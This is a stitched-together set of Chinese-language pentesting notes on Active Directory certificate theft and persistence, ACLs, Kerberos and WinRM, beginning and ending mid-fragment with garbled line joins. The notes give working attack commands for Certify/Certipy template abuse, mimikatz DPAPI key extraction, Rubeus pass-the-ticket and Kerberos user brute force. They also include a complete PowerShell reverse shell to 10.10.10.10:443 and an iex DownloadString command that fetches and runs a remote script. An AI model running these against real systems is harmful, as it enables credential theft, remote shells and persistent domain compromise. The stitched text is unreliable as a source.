1(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))) # 6. Abuse 1234567891011# Request an enrollment agent certificateCertify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgentcertipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'# Enrollment agent certificate to issue a certificate request on behalf of# another user to a template that allow for domain authenticationCertify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /on

title: AD CS Certificate Theft 技术笔记
content: 来源路径： 02-知识点/域与Windows/AD CS Certificate Theft 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # AD CS Certificate Theft 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 AD CS Certificate Theft 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 AD CS Certificate Theft 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：AD CS Certificate Theft、What can I do with a certificate、Exporting Certificates Using the 密码学 APIs – THEFT1、User Certificate Theft via DPAPI – THEFT2、Machine Certificate Theft via DPAPI – THEFT3；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 5 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 AD CS Certificate Theft What can I do with a certificate Exporting Certificates Using the 密码学 APIs – THEFT1 User Certificate Theft via DPAPI – THEFT2 Machine Certificate Theft via DPAPI – THEFT3 Finding Certificate Files – THEFT4 NTLM Credential Theft via PKINIT – THEFT5 (UnPAC the 哈希) # 核心要点 Before checking how to steal the certificates here you have some info about how to find what the certificate is useful for: ../../windows-local-privilege-escalation/dpapi-extracting-passwords.md To extract a certificate and its associated private key, the process involves: Selecting the target certificate from the user’s store and retrieving its key store name. .crt/.cer for certificates only, .csr for Certificate Signing Requests, which do not contain certificates or private keys, .jks/.keystore/.keys for Java Keystores, which may hold certificates along with private keys utilized by Java applications. Rubeus can also get this information with the option asktgt [...] /getcredentials. # 命令 / 载荷 / 操作片段 # 1. What can I do with a certificate 123456789# Powershell$CertPath = "C:\path\to\cert.pfx"$CertPass = "P@ssw0rd"$Cert = New-ObjectSystem.Security.Cryptography.X509Certificates.X509Certificate2 @($CertPath, $CertPass)$Cert.EnhancedKeyUsageList# cmdcertutil.exe -dump -v cert.pfx # 2. User Certificate Theft via DPAPI – THEFT2 12345# With mimikatz, when running in the user's contextdpapi::masterkey /in:"C:\PATH\TO\KEY" /rpc# With mimikatz, if the user's password is knowndpapi::masterkey /in:"C:\PATH\TO\KEY" /sid:accountSid /password:PASS # 3. User Certificate Theft via DPAPI – THEFT2 12345# Decrypting using SharpDPAPISharpDPAPI.exe certificates /mkfile:C:\temp\mkeys.txt# Converting .pem to .pfxopenssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx # 4. Finding Certificate Files – THEFT4 12345678# Example command to search for certificate files in PowerShellGet-ChildItem -Recurse -Path C:\Users\ -Include *.pfx, *.p12, *.pkcs12, *.pem, *.key, *.crt, *.cer, *.csr, *.jks, *.keystore, *.keys# Example command to use pfx2john.py for extracting a hash from a PKCS#12 filepfx2john.py certificate.pfx > hash.txt# Command to crack the hash with JohnTheRipperjohn --wordlist=passwords.txt hash.txt # 5. NTLM Credential Theft via PKINIT – THEFT5 (UnPAC the 哈希) 1tgt::pac /caname:generic-DC-CA /subject:genericUser /castore:current_user /domain:domain.local # 工具与参考入口 https://www.specterops.io/assets/resources/Certified Pre-Owned.pdf TheWover’s CertStealer C# project SharpDPAPI fossies.org https://github.com/gentilkiwi/kekeo https://github.com/CCob/PinSwipe https://github.com/GhostPack/Rubeus # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Active Directory 攻击链 AD CS 证书攻击 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

title: AD CS Account 持久化
content: 来源路径： 02-知识点/域与Windows/AD CS Account 持久化.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # AD CS Account 持久化 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 AD CS Account 持久化 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 AD CS Account 持久化 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Understanding Active User Credential Theft with Certificates – PERSIST1、Gaining Machine 持久化 with Certificates：PERSIST2、Extending 持久化 Through Certificate Renewal：PERSIST3、Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4、Building Strong altSecurityIdentities Mappings；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 9 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Understanding Active User Credential Theft with Certificates – PERSIST1 Gaining Machine 持久化 with Certificates：PERSIST2 Extending 持久化 Through Certificate Renewal：PERSIST3 Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4 Building Strong altSecurityIdentities Mappings Enrollment Agent as 持久化 – PERSIST5 2025 Strong Certificate Mapping Enforcement: Impact on 持久化 # 核心要点 This is a small summary of the account 持久化 chapters of the awesome research from https://specterops.io/assets/resources/Certified Pre-Owned.pdf A certificate’s power lies in its ability to authenticate as the user it belongs to, regardless of 密码 changes, as long as the certificate remains valid. Note: Combined with other techniques (see THEFT sections), certificate-based auth allows persistent access without touching LSASS and even from non-elevated contexts. If an attacker has elevated privileges on a host, they can enroll the compromised system’s machine account for a certificate using the default Machine template. Authenticating as the machine enables S4U2Self for local services and can provide durable host 持久化: Operational tip: Track lifetimes on attacker-held PFX files and renew early. Renewal can also cause updated certificates to include the modern SID mapping extension, keeping them usable under stricter DC mapping rules (see next section). If you can write to a target account’s altSecurityIdentities attribute, you can explicitly map an attacker-controlled certificate to that account. This persists across 密码 changes and, when using strong mapping formats, remains functional under modern DC enforcement. The mapping works on both user and computer objects, so write access to a computer account's altSecurityIdentities is enough to persist as that machine. Schannel 认证 remains useful for 持久化 even when PKINIT fails because the DC lacks the Smart Card Logon EKU or returns KDC ERR PADATA TYPE NOSUPP. Modern Certipy versions support both -on-behalf-of and -renew, so an attacker holding an Enrollment Agent PFX can mint and later renew leaf certificates without re-touching the original target account. If PKINIT-based TGT retrieval is not possible, the resulting on-behalf-of certificate is still usable for Schannel 认证 with certipy auth -pfx victim onbo.pfx -dc-ip 10.0.0.10 -ldap-shell. Explicit mappings using strong formats (Issuer+Serial, SKI, SHA1-PublicKey) continue to work. Weak formats (Issuer/Subject, Subject-only, RFC822) can be blocked and should be avoided for 持久化. Changes to altSecurityIdentities and issuance/renewals of Enrollment Agent and User certificates. # 命令 / 载荷 / 操作片段 # 1. Understanding Active User Credential Theft with Certificates – PERSIST1 12345678# Enumerate client-auth capable templatesCertify.exe find /clientauth# Request a user cert from an Enterprise CA (current user context)Certify.exe request /ca:CA-SERVER\CA-NAME /template:User# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by defaultcertipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx # 2. Understanding Active User Credential Theft with Certificates – PERSIST1 12345678# Convert PEM returned by Certify to PFXopenssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx# Use certificate for PKINIT and inject the TGTRubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt# Or with Certipycertipy auth -pfx user.pfx -dc-ip 10.0.0.10 # 3. Gaining Machine 持久化 with Certificates：PERSIST2 12345# Request a machine certificate as SYSTEMCertify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine# Authenticate as the machine using the issued PFXRubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt # 4. Extending 持久化 Through Certificate Renewal：PERSIST3 12345678# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)# Provide the existing PFX and target the same CA/template when possiblecertipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \ -template 'User' -p

content: 来源路径： 02-知识点/域与Windows/ACLs：DACLs-SACLs-ACEs 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # ACLs：DACLs-SACLs-ACEs 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 ACLs：DACLs-SACLs-ACEs 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 ACLs：DACLs-SACLs-ACEs 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：ACLs：DACLs/SACLs/ACEs、Access Control List (ACL)、Key Components、System Interaction with ACLs、Summarized Process；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页当前以概念和流程为主；后续实验时可补充最小复现命令和输出样例。 # 关键主题 ACLs：DACLs/SACLs/ACEs Access Control List (ACL) Key Components System Interaction with ACLs Summarized Process ACEs Order of ACEs GUI Example Explaining Access Control in a Simplified Manner Denying Access to a Specific Group Allowing Access to a Specific Member of a Denied Group Understanding Access Control Entries Key Differences Between ACE Types Access Control Entry Layout Access Mask Layout # 核心要点 The process of accessing a file involves the system checking the object's security descriptor against the user's access 令牌 to determine if access should be granted and the extent of that access, based on the ACEs. SACL: Used for auditing access to objects, where ACEs define the types of access to be logged in the Security Event Log. This can be invaluable for detecting unauthorized access attempts or troubleshooting access issues. Each user session is associated with an access 令牌 that contains security information relevant to that session, including user, group identities, and privileges. This 令牌 also includes a logon SID that uniquely identifies the session. Access 令牌: Contains user, group, and privilege information for a session. Access Decision: Made by comparing DACL ACEs with the access 令牌；SACLs are used for auditing. An Access-Denied ACE explicitly denies the requested rights to a trustee identified in the access 令牌. Access-Allowed ACE(s) explicitly grant all requested rights to a trustee in the access 令牌. # 工具与参考入口 access mask NTFS access control entry ordering diagram Example from here https://www.ntfs.com/ntfs-permissions-acl-use.htm https://www.coopware.in2.info/\ ntfsacl ht.htm # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/88tcp-udp：Pentesting Kerberos 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 88tcp-udp：Pentesting Kerberos 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 88tcp-udp：Pentesting Kerberos 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 88tcp-udp：Pentesting Kerberos 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：88tcp/udp：Pentesting Kerberos、Basic Information、To learn how to abuse Kerberos you should read the post about Active Directory 域 **.**、Kerberos-only environments: client prep and troubleshooting、More；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 7 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 88tcp/udp：Pentesting Kerberos Basic Information To learn how to abuse Kerberos you should read the post about Active Directory 域 **.** Kerberos-only environments: client prep and troubleshooting More Shodan MS14-068 HackTricks Automatic Commands # 核心要点 Kerberos operates on a principle where it authenticates users without directly managing their access to resources. This is an important distinction because it underlines the protocol's role in security frameworks. When NTLM is disabled on domain services (SMB/WinRM/etc.), you must authenticate with Kerberos. Common pitfalls and a working workflow: Time synchronization is mandatory. If your host clock is skewed by more than a few minutes you will see KRB AP ERR SKEW and all Kerberos auth will fail. Sync against the DC: Generate a valid krb5.conf for the target realm/domain. netexec (CME fork) can output one for you while testing SMB: Use Kerberos with SMB tooling (no passwords sent, uses your ccache): Ensure your /etc/hosts resolves the exact FQDN you will SSH/SMB to, and that it comes before any bare domain entries if you are overriding DNS. SPN mismatches break GSSAPI. If NTLM is disabled on SMB you may see STATUS NOT SUPPORTED with NTLM attempts; add -k to force Kerberos. # 命令 / 载荷 / 操作片段 # 1. Basic Information 12PORT STATE SERVICE88/tcp open kerberos-sec # 2. Kerberos-only environments: client prep and troubleshooting 12# quick one-shot sync (requires sudo)sudo ntpdate <dc.fqdn> || sudo chronyd -q 'server <dc.fqdn> iburst' # 3. Kerberos-only environments: client prep and troubleshooting 123# Generate krb5.conf and install itnetexec smb <dc.fqdn> -u <user> -p '<pass>' -k --generate-krb5-file krb5.confsudo cp krb5.conf /etc/krb5.conf # 4. Kerberos-only environments: client prep and troubleshooting 12kinit <user>klist # 5. Kerberos-only environments: client prep and troubleshooting 1234# netexec / CMEnetexec smb <dc.fqdn> -k # lists shares, runs modules using Kerberos# impacket examples also support -k / --no-pass to use the ccachesmbclient --kerberos //<dc.fqdn>/IPC$ # 6. Kerberos-only environments: client prep and troubleshooting 123# Ensure krb5.conf is correct and you have a TGT (kinit)# Use the FQDN that matches the host SPN. Wrong names cause: "Server not found in Kerberos database"ssh -o GSSAPIAuthentication=yes <user>@<host.fqdn> # 7. HackTricks Automatic Commands 123456789101112131415161718192021222324252627Protocol_Name: Kerberos #Protocol Abbreviation if there is one.Port_Number: 88 #Comma separated if there is more than one.Protocol_Description: AD Domain Authentication #Protocol Abbreviation Spelled outEntry_1: Name: Notes Description: Notes for Kerberos Note: | Kerberos operates on a principle where it authenticates users without directly managing their access to resources. This is an important distinction because it underlines the protocol's role in security frameworks. In environments like **Active Directory**, Kerberos is instrumental in establishing the identity of users by validating their secret passwords. This process ensures that each user's identity is confirmed before they interact with network resources. However, Kerberos does not extend its functionality to evaluate or enforce the permissions a user has over specific resources or services. Instead, it provides a secure way of authenticating users, which is a critical first step in the security process. https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-kerberos-88/index.htmlEntry_2: Name: Pre-Creds Description: Brute Force to get Usernames Command: nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="{Domain_Name}",userdb={Big_Userlist} {IP}Entry_3: Name: With Usernames Description: Brute Force with Usernames and Passwords Note: consider git clone https://github.com/ropnop/kerbrute.git ./kerbrute -hEntry_4: Name: With Creds Description: Attempt to get a list of user service principal names Command: GetUserSPNs.py -request -dc-ip {IP} active.htb/svc_tgs # 工具与参考入口 https://github.com/SecWiki/windows-kernel-exploits/tree/master/M

Create Custom Application 123splunk_shell/├── bin (reverse shell scripts)└── default (inputs.conf configuration) # 2. Create Custom Application 123456789101112$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()};$client.Close() # 3. To determine if WinRM is operational, checking for the opening of specific ports is recommended: This approach involves adding a wildcard to the trustedhosts configuration, a step that requires cautious consideration due to its implications. It's also noted that altering the network type from "Public" to "Work" might be necessary on the attacker's machine. To execute ipconfig remotely on a target machine and view its output do: You can also execute a command of your current PS console via Invoke-Command . Suppose that you have locally a function called 枚举 and you want to execute it in a remote computer, you can do: To get an interactive PowerShell shell use Enter-PSSession: Read documentation on its github: https://github.com/Hackplayers/evil-winrm Code extracted from here: https://alamot.github.io/winrm shell/ Evil-WinRM v3.x (2024) – now supports Kerberos (-k / --spn) and certificate-based 认证 (--cert-pem/--key-pem), session logging (-L) and the ability to disable remote path completion (-N). Python – pypsrp 0.9 (2024) offers WinRM & PS-Remoting from Linux, including CredSSP and Kerberos: 检测 – monitor the Microsoft-Windows-WinRM/Operational log: Event 91 / 163 – shell created # 命令 / 载荷 / 操作片段 # 1. Initiating a WinRM Session 12Enable-PSRemoting -ForceSet-Item wsman:\localhost\client\trustedhosts * # 2. Initiating a WinRM Session 1wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force" # 3. Test if configured 1Test-WSMan <target-ip> # 4. Execute a command 1Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username] # 5. Execute a command 1Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"] # 6. Execute a Script 1Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta] # 7. Get reverse-shell 1Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"} # 8. Get a PS session 1234567891011121314#If you need to use different creds$password=[REDACTED_SECRET] 'Stud41Password@123' -Asplaintext -force## Note the ".\" in the suername to indicate it's a local user (host domain)$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)# EnterEnter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]## Bypass proxyEnter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)# Save session in var$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)Enter-PSSession $sess## Background current PS sessionExit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...) # 9. Forcing WinRM Open 1.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force" # 10. Saving and Restoring sessions 123456789#If you need to use different creds$password=[REDACTED_SECRET] 'Stud41Password@123' -Asplaintext -force## Note the ".\" in the suername to indicate it's a local user (host domain)$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)#You can save a session inside a variable$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]#And restore it at any moment doingEnter-PSSession -Session $sess1 # 11.
